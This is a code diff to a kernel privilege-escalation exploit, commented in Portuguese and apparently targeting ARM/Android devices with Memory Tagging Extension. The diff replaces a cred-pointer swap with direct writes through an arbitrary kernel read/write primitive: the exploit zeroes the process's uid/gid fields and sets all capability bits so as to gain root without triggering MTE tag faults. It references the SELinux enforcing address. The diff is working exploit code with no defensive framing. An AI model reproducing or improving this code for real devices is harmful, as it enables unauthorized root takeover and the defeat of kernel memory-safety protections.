@@ -146,7 +146,8 @@ static uintptr_t find_task_by_mm_pointer(int fd, uintptr_t init_task_addr,
 }
 
 /* --------------------------------------------------------------------------
- * Escalada direta via cred overwrite (sem workqueue / UMH)
+ * Escalada MTE-safe: modifica campos inteiros do cred existente
+ * NÃO troca o ponteiro cred (evita MTE tag fault)
  * -------------------------------------------------------------------------- */
 static int install_direct_cred_root(int fd) {
   uintptr_t selinux_addr = data_addr(SELINUX_ENFORCING);
@@ -173,12 +174,10 @@ static int install_direct_cred_root(int fd) {
     current_task = find_task_by_pid_tasks_list(fd, init_task_addr, my_pid);
   }
 
-  /* Plano C: mm pointer (se o exploit leakerou mm_struct previamente) */
+  /* Plano C: mm pointer (fallback se nada mais funcionar) */
   if (!current_task) {
-    /* Tentar ler o mm do init_task como fallback — não é ideal,
-     * mas se nada mais funcionar, podemos tentar scan por active_mm */
     pr_warn("root cred PID scan failed, trying mm pointer fallback\n");
-    /* Nota: mm_addr precisaria ser passado de fora. Por enquanto,
+    /* mm_addr precisaria ser passado de fora; por enquanto,
      * se os dois primeiros planos falharem, retorna erro. */
   }
 
@@ -188,24 +187,32 @@ static int install_direct_cred_root(int fd) {
     return 0;
   }
 
-  /* 3. Valida cred pointer */
+  /* 3. Lê o ponteiro cred ATUAL (já tem tag MTE correta) */
   uintptr_t cred_ptr = root_read64(fd, current_task + TASK_CRED_OFF);
   if (!is_direct_ptr(cred_ptr)) {
     pr_error("root cred invalid cred pointer %016zx\n", cred_ptr);
     return 0;
   }
 
-  /* 4. Sobrescreve current->cred = &init_cred */
-  uintptr_t init_cred_addr = data_addr(INIT_CRED_OFF);
-  int cred_write = root_write64(
-      fd, current_task + TASK_CRED_OFF, init_cred_addr);
-  if (!cred_write) {
-    pr_error("root cred write failed task=%016zx cred=%016zx\n",
-             current_task, init_cred_addr);
-    return 0;
-  }
+  pr_info("root cred modifying cred struct at %016zx\n", cred_ptr);
 
-  /* 5. Verifica se pegou root */
+  /* 4. Sobrescreve uid/gid/euid/suid/fsuid = 0 (MTE-safe: só inteiros) */
+  root_write32(fd, cred_ptr + CRED_UID_OFF, 0);
+  root_write32(fd, cred_ptr + CRED_GID_OFF, 0);
+  root_write32(fd, cred_ptr + CRED_SUID_OFF, 0);
+  root_write32(fd, cred_ptr + CRED_SGID_OFF, 0);
+  root_write32(fd, cred_ptr + CRED_EUID_OFF, 0);
+  root_write32(fd, cred_ptr + CRED_EGID_OFF, 0);
+  root_write32(fd, cred_ptr + CRED_FSUID_OFF, 0);
+  root_write32(fd, cred_ptr + CRED_FSGID_OFF, 0);
+
+  /* 5. Sobrescreve capabilities = all (0xffffffffffffffff) */
+  root_write64(fd, cred_ptr + CRED_CAP_INHERITABLE_OFF, ~0ULL);
+  root_write64(fd, cred_ptr + CRED_CAP_PERMITTED_OFF, ~0ULL);
+  root_write64(fd, cred_ptr + CRED_CAP_EFFECTIVE_OFF, ~0ULL);
+  root_write64(fd, cred_ptr + CRED_CAP_BSET_OFF, ~0ULL);
+
+  /* 6. Verifica se pegou root */
   root_uid_after = (uint32_t)getuid();
   pr_info("root cred applied uid_before=%u uid_after=%u\n",
           root_uid_before, root_uid_after);
